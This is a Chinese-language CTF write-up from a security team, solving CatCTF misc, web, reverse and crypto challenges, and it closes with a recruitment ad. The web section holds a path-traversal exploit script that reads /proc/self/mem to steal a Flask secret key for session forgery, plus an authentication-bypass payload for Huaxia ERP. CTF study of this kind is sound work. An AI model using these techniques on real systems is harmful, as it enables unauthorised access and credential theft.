# NepnepxCATCTF部分WriteUp

> 原文: https://www.ctfiot.com/89555.html
> ID: 89555

喜迎元旦      携手启航2023

在这辞旧迎新的时刻，天权信安网络安全团队向所有关心并支持天权信安发展的网安人，致以新年的问候和诚挚的祝福！

MISC

01

.Cat_Jump

因为是vmdk文件，所以直接用十六进制编辑器打开搜索CatCTF{

找到flag:

FLAG：CatCTF{EFI_1sv3ry_funn9}

02

.Peekaboo

在图片尾部找到QQ号，访问空间

直接登录王者上号搜索：

发现当前赛季仅使用过打野英雄游戏，查看一下打野英雄的数据

只用过三名英雄，查看一下各英雄的详细数据（PS：此时已经可以开始试flag了）

查看发现最后使用的英雄为百里玄策，所以flag为CatCTF{bailixuance}

FLAG：CatCTF{bailixuance}

03

.miao~

jpg文件尾部找到一个wav文件：

手动分离出来，放入audacity工具中：

查看频谱图

推测是一个密码，一番尝试后发现需要使用DeepSound工具解密

输入密码CatCTF

得到flag.txt，打开

兽语密码，使用http://hi.pcmoe.net/roar.html在线解密

解密得到flag

FLAG：CatCTF{d0_y0u_Hate_c4t_ba3k1ng_?_M1ao~}

04.CatCat

首先看到txt文件：

根据文件名推测为rabbit，使用

https://www.sojson.com/encrypt_rabbit.html在线解密

解密失败，推测需要密码，查看jpg文件

图片显示明显有问题，推测是因为插入数据导致图片受损，用010Edior打开jpg文件，搜索password

得到密码catflag，再次使用网站在线解密rabbit

根据文件名可以知道解出的内容应该是base91编码，使用解码工具解密

观察发现具有Ook密码特征，将cat替换为Ook后使用

https://www.splitbrain.org/services/ook在线解密

解得flag：CATCTF{Th1s_V3ry_cute_catcat!!!}，

将CATCTF改为CatCTF

提交FLAG：CatCTF{Th1s_V3ry_cute_catcat!!!}

05.MeowMeow

打开readme.md

根据md文件推测需要从png文件中找到三段密文，使用010Editor打开png文件，拖到底部

右侧缩略图看到疑似图案

根据md文件内容及观察得到flag：CatCTF{CAT_GOES_MEOW}。

（PS：C与G的区别是G明显有一提）

FLAG：CatCTF{CAT_GOES_MEOW}

06.CatchCat

看到一大堆坐标根据经验推测flag为坐标轨迹，将经纬度从txt文件中手动提取出来后作坐标使用Python绘图

exp:
import matplotlib.pyplot as pltimport numpy as npx, y = np.loadtxt('flag.txt', delimiter=',', unpack=True)plt.plot(x, y, '.')plt.show()

flag.txt:

执行得到

貌似右边为反转后的C，那么左边为反转后的}，使用Python对图像镜像反转

exp：from PIL import Imageim = Image.open("1.png")pim = im.load()an = Image.open("1.png")ans = an.load()for i in range(im.size[0]): for j in range(im.size[1]): ans[i, j] = pim[-i-1, j]an.show()

执行

勉强可以看出有CatCTF{}字样，根据轨迹手绘后得到

NMEA在线网站https://mygeodata.cloud/converter/nmea-to-kml

这个1让我错失一血。。。

画出flag：CatCTF{GPS_M1ao}FLAG：CatCTF{GPS_M1ao}

07.Nepnep祝你新年快乐啦！

视频最后一帧：

08.CatFlag

cat flag：

FLAG：CatCTF{!2023_Will_Be_Special,2022_Was_Not!}

09.CatPaw

小米备份文件，可以用7zip打开得到apk，对apk进行分析，跳转到加密代码

通过分析代码，发现只需要最后的md5值和8b9b0ad9c324204fac87ae0fc2c630bd相等即可

同时资源中又发现password必须大于5位

在so中发现读取/dev/input/event1并保存在应用目录下

备份文件中的数据文件就是保存下来的输入数据

利用命令即可模拟输入

一次输入是CatC，大概是因为输入的时候报错了，我的手机并不是小米手机，只是刷了MIUI系统，可能是这个原因导致报错，没有全部输入完成

WEB

01.ez_js

F12查看调试器，在js/game.js中搜索flag

找到flag的地址，访问

得到flag

FLAG：flag{7s_g4m3_ju5t_f1nd_1t}

02.catcat

跟2022蓝帽杯的`file_session`存在一样的考点[公众号](https://mp.weixin.qq.com/s?__biz=MzkyNDA5NjgyMg==&mid=2247493655&idx=1&sn=2eafc10949807487d993882220d05271&chksm=c1d9a84ef6ae2158dac0f1e00fc04efd4e8a0966e16aaaf7a1c00e46ff1fa97b5f574d051721&mpshare=1&scene=23&srcid=07134xssC34Apm45RHto6pPS&sharer_sharetime=1657706356282&sharer_shareid=bc030b6a5149970738c6328966d9421d#rd)

在`http://223.112.5.156:
54007/info?file=../app.py`存在任意文件读取

查看app.py源码

```pyb'import osimport uuid
from flask import Flask, request, session, render_template, Markup
from cat import catflag = ""app = Flask( __name__, static_url_path='/', static_folder='static' )app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh"if os.path.isfile("/flag"): flag = cat("/flag") os.remove("/flag")@app.route('/', methods=['GET'])def index(): detailtxt = os.listdir('./details/') cats_list = [] for i in detailtxt: cats_list.append(i[:i.index('.')]) return render_template("index.html", cats_list=cats_list, cat=cat)@app.route('/info', methods=["GET", 'POST'])def info(): filename = "./details/" + request.args.get('file', "") start = request.args.get('start', "0") end = request.args.get('end', "0") name = request.args.get('file', "")[:
request.args.get('file', "").index('.')] return render_template("detail.html", catname=name, info=cat(filename, start, end))@app.route('/admin', methods=["GET"])def admin_can_list_root(): if session.get('admin') == 1: return flag else: session['admin'] = 0 return "NoNoNo"if __name__ == '__main__': app.run(host='0.0.0.0', debug=False, port=5637)'```

发现他对`/flag`调用了cat()后把flag删了，然后再看看cat.py

cat.py```pyb'import os, sys, getopt
def cat(filename, start=0, end=0)->bytes: data = b'' try: start = int(start) end = int(end) 
except: start=0 end=0 if filename != "" and os.access(filename, os.R_OK): f = open(filename, "rb") if start >= 0: f.seek(start) if end >= start and end != 0: data = f.read(end-start) else: data = f.read() else: data = f.read() f.close() else: data = ("File `%s` not exist or can not be read" % filename).encode() return dataif __name__ == '__main__': opts,args = getopt.getopt(sys.argv[1:],'-h-f:-s:-e:',['help','file=','start=','end=']) fileName = "" start = 0 end = 0 for opt_name, opt_value in opts: if opt_name == '-h' or opt_name == '--help': print("[*] Help") print("-f --file File name") print("-s --start Start position") print("-e --end End position") print("[*] Example of reading /etc/passwd") print("python3 cat.py -f /etc/passwd") print("python3 cat.py --file /etc/passwd") print("python3 cat.py -f /etc/passwd -s 1") print("python3 cat.py -f /etc/passwd -e 5") print("python3 cat.py -f /etc/passwd -s 1 -e 5") exit() elif opt_name == '-f' or opt_name == '--file': fileName = opt_value elif opt_name == '-s' or opt_name == '--start': start = opt_value elif opt_name == '-e' or opt_name == '--end': end = opt_value if fileName != "": print(cat(fileName, start, end)) else: print("No file to read")'```

可以发现，这个函数是使用了seek来调整文件读取位置的

因为python的对象都是存储在堆上的，所以先在`/proc/self/maps`上找到堆栈分布，找偏移量为0的（不知道为什么，反正是照着exp猜测的）

然后在`/proc/self/mem`里通过对应的偏移量找key

```pyimport requests, reurl = "http://223.112.5.156:
54007/"maps_url = f"{url}/info?file=../../../../../proc/self/maps"#需要匹配的堆地址maps_reg = "([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0"#从/proc/self/maps中匹配堆地址位置maps = re.findall(maps_reg, requests.get(maps_url).text)
# print(maps)#从匹配到的结果一个个遍历读取for m in maps: start, end = m.split("-")[0], m.split("-")[1] start, end = str(int(start, 16)), str(int(end, 16)) read_url = f"{url}/info?file=../../../../../proc/self/mem&start={start}&end={end}" s = requests.get(read_url).content print(s) # 匹配的secret_key格式 rt = re.findall(b"[a-z0-9]{8}[a-z0-9]{4}[a-z0-9]{4}[a-z0-9]{4}[a-z0-9]{12}*abcdefgh", s) if rt: print(rt)```

得到key，伪造session，访问/admin，得到flag

03.ezbypass

华夏erp授权绕过

参考[华夏ERP漏洞之授权绕过漏洞+后台命令执行漏洞=未授权命令执行](https://cn-sec.com/archives/387212.html)

就是说url里存在

```.css#.js#.jpg#.png#.gif#.ico```就不会进行认证，从而绕过登录payload```GET /a.css/../flag.html```

需要在burp里传：

Reverse

01.The cat did it

问题：我离开猫猫的概率是多少？

然后给出了一堆公式

因为是CatCTF所以我离开猫猫的概率是0%

md5(0%) = 9f1ef07877f9d85a82bd500f408b4814

FLAG：CatCTF{9f1ef07877f9d85a82bd500f408b4814}

Crypto

01.cat’s gift

猫猫给的当然会是食物啦，但是鱼不对，看到下面的数学就想到了π，对应食物也就是派，所以flag是CatCTF{pie}

总共4份就是π

FLAG：CatCTF{pie}

招新小广告

2023年招新计划(主力/NMEGREZ)

注：不限年龄与职业要求，只要不是纯小白(或者是初学者未参与过任何一场比赛的人)就有机会通过审核，天权信安对外长期招新，出色的师傅能够参与团队项目和竞赛项目建设。

PWN：要求技术中等偏上（曾参与过省级/国家级网安赛事荣获过奖项的师傅优先考虑）

REVERSE：要求技术中等（曾参与过省级/国家级网安赛事荣获过奖项的师傅优先考虑）

CRYPTO：要求技术中等偏上

WEB：要求技术中等偏上

取证：曾参与过省级网安取证赛事荣获过奖项的师傅

BLOCKCHAIN/IOT/工控/AI：要求技术中等

CTF竞赛靶场/TQCTF练习平台运维师傅：若干名，熟悉docker操作、动态题目部署、以及常规运维，还具备组网部署经验和Linux、Windows系统部署和日常维护，能使靶场平台在各种环境中正常运行。

 欢迎联系：

投递邮箱：megrez@megrezsec.cn（Evan师傅）

–天权信安网络安全团队–

网络无边 安全有界

2022，感恩有您

2023，携手同行

用技术撬动未来，用奋斗描绘成功！


```
exp:
import matplotlib.pyplot as pltimport numpy as npx, y = np.loadtxt('flag.txt', delimiter=',', unpack=True)plt.plot(x, y, '.')plt.show()
exp：from PIL import Imageim = Image.open("1.png")pim = im.load()an = Image.open("1.png")ans = an.load()for i in range(im.size[0]): for j in range(im.size[1]): ans[i, j] = pim[-i-1, j]an.show()
画出flag：CatCTF{GPS_M1ao}FLAG：CatCTF{GPS_M1ao}
```pyb'import osimport uuid
from flask import Flask, request, session, render_template, Markup
from cat import catflag = ""app = Flask( __name__, static_url_path='/', static_folder='static' )app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh"if os.path.isfile("/flag"): flag = cat("/flag") os.remove("/flag")@app.route('/', methods=['GET'])def index(): detailtxt = os.listdir('./details/') cats_list = [] for i in detailtxt: cats_list.append(i[:i.index('.')]) return render_template("index.html", cats_list=cats_list, cat=cat)@app.route('/info', methods=["GET", 'POST'])def info(): filename = "./details/" + request.args.get('file', "") start = request.args.get('start', "0") end = request.args.get('end', "0") name = request.args.get('file', "")[:
request.args.get('file', "").index('.')] return render_template("detail.html", catname=name, info=cat(filename, start, end))@app.route('/admin', methods=["GET"])def admin_can_list_root(): if session.get('admin') == 1: return flag else: session['admin'] = 0 return "NoNoNo"if __name__ == '__main__': app.run(host='0.0.0.0', debug=False, port=5637)'```
cat.py```pyb'import os, sys, getopt
def cat(filename, start=0, end=0)->bytes: data = b'' try: start = int(start) end = int(end) 
except: start=0 end=0 if filename != "" and os.access(filename, os.R_OK): f = open(filename, "rb") if start >= 0: f.seek(start) if end >= start and end != 0: data = f.read(end-start) else: data = f.read() else: data = f.read() f.close() else: data = ("File `%s` not exist or can not be read" % filename).encode() return dataif __name__ == '__main__': opts,args = getopt.getopt(sys.argv[1:],'-h-f:-s:-e:',['help','file=','start=','end=']) fileName = "" start = 0 end = 0 for opt_name, opt_value in opts: if opt_name == '-h' or opt_name == '--help': print("[*] Help") print("-f --file File name") print("-s --start Start position") print("-e --end End position") print("[*] Example of reading /etc/passwd") print("python3 cat.py -f /etc/passwd") print("python3 cat.py --file /etc/passwd") print("python3 cat.py -f /etc/passwd -s 1") print("python3 cat.py -f /etc/passwd -e 5") print("python3 cat.py -f /etc/passwd -s 1 -e 5") exit() elif opt_name == '-f' or opt_name == '--file': fileName = opt_value elif opt_name == '-s' or opt_name == '--start': start = opt_value elif opt_name == '-e' or opt_name == '--end': end = opt_value if fileName != "": print(cat(fileName, start, end)) else: print("No file to read")'```
```pyimport requests, reurl = "http://223.112.5.156:
54007/"maps_url = f"{url}/info?file=../../../../../proc/self/maps"#需要匹配的堆地址maps_reg = "([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0"#从/proc/self/maps中匹配堆地址位置maps = re.findall(maps_reg, requests.get(maps_url).text)
# print(maps)#从匹配到的结果一个个遍历读取for m in maps: start, end = m.split("-")[0], m.split("-")[1] start, end = str(int(start, 16)), str(int(end, 16)) read_url = f"{url}/info?file=../../../../../proc/self/mem&start={start}&end={end}" s = requests.get(read_url).content print(s) # 匹配的secret_key格式 rt = re.findall(b"[a-z0-9]{8}[a-z0-9]{4}[a-z0-9]{4}[a-z0-9]{4}[a-z0-9]{12}*abcdefgh", s) if rt: print(rt)```
```.css#.js#.jpg#.png#.gif#.ico```就不会进行认证，从而绕过登录payload```GET /a.css/../flag.html```
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/8-1672741031.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1672741033.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/0-1672741036.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/6-1672741036.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/6-1672741039.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/4-1672741040.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/9-1672741041.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/10-1672741041.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/3-1672741043.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/3-1672741044.png)